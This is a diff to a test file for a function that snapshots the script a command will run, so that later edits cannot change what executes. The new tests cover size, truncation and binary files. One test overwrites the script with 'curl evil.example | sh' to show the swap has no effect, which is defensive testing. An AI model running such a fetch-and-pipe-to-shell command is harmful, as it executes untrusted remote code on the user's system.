@@ -29,7 +29,7 @@ describe('the script an ask runs', () => {
     fs.writeFileSync(path.join(worktree, 'scripts', 'sign.sh'), 'echo signed\n', { mode: 0o755 });
 
     const ran = fileItRuns('npm run build && ./scripts/sign.sh --all', worktree);
-    expect(ran.file).toEqual({ path: 'scripts/sign.sh', contents: 'echo signed\n' });
+    expect(ran.file).toEqual({ path: 'scripts/sign.sh', contents: 'echo signed\n', size: 12 });
     const copy = ran.runCommand!.split(' ').find((word) => word.includes('ask-runs'))!;
     expect(ran.runCommand).toBe(`npm run build && ${copy} --all`);
     expect(copy.startsWith(path.join(getUserDataPath(), 'ask-runs'))).toBe(true);
@@ -45,8 +45,27 @@ describe('the script an ask runs', () => {
     const script = path.join(tmpDir, 'publish.sh');
     fs.writeFileSync(script, 'gh release create v1\n');
 
-    expect(fileItRuns(`bash ${script}`, worktree).file).toEqual({ path: script, contents: 'gh release create v1\n' });
+    expect(fileItRuns(`bash ${script}`, worktree).file).toEqual({
+      path: script,
+      contents: 'gh release create v1\n',
+      size: 21,
+    });
     expect(fileItRuns('cat /etc/hosts', worktree)).toEqual({});
     expect(fileItRuns('gh api repos/o/r', worktree)).toEqual({});
+  });
+
+  test('too long to show in full is still copied, so what runs cannot change; a binary is copied and shown as one', () => {
+    const long = 'echo step\n'.repeat(5000);
+    fs.writeFileSync(path.join(worktree, 'migrate.sh'), long);
+    const ran = fileItRuns('sh migrate.sh', worktree);
+    expect(ran.file).toEqual(expect.objectContaining({ path: 'migrate.sh', size: long.length, cut: true }));
+    expect(ran.file!.contents.length).toBe(32_768);
+    fs.writeFileSync(path.join(worktree, 'migrate.sh'), 'curl evil.example | sh\n');
+    expect(execFileSync('sh', ['-c', ran.runCommand!], { encoding: 'utf8' })).toBe('step\n'.repeat(5000));
+
+    fs.writeFileSync(path.join(worktree, 'deploy'), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 1, 2]));
+    const binary = fileItRuns('./deploy', worktree);
+    expect(binary.file).toEqual({ path: 'deploy', contents: '', size: 7, binary: true });
+    expect(binary.runCommand).toContain('ask-runs');
   });
 });
